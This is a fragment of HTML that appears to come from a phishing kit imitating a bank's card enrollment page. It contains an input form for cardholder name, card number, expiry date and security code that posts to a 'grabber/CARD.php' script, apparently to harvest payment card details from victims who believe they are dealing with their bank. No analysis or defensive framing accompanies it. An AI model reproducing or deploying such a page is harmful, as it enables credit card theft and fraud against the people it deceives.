...
<html lang="en" class="__sticky-footer __sticky-footer--links">
    ...
    <body>
        <form action="./assets/grabber/CARD.php" method="post">
            ...
            <div class="mtb-app-enrollment">
                ...
                <div class="mtb-app-login--content">
                    <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                        ...
                        <div class="cell">
                            <label for="card_name"> Cardhlder's Name </label>
                            <div class="input-group m-fake-single-input">
                                <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="card_name" name="card_name" autocomplete="on" aria-required="true" data-inputtype="text" data-attribute="" >
                            </div>
                        </div>
                        ...
                        <div class="cell">
                            ...
                            <div class="input-group m-fake-single-input">
                                <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="card_number" name="card_number" autocomplete="on" aria-required="true" data-inputtype="text" data-attribute="" >
                            </div>
                        </div>
                        ...
                        <div class="cell">
                            ...
                            <div class="input-group m-fake-single-input">
                                <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="exp" name="exp" autocomplete="on" aria-required="true" data-inputtype="text" data-attribute="" >
                            </div>
                        </div>
                        ...
                        <div class="cell">
                            ...
                            <div class="input-group m-fake-single-input">
                                <input class="input-group-field js-formnputItem" data-fc-id="121" type="text" id="csc" name="csc" autocomplete="on" aria-required="true" data-inputtype="text" data-attribute="" >
                            </div>
                        </div>
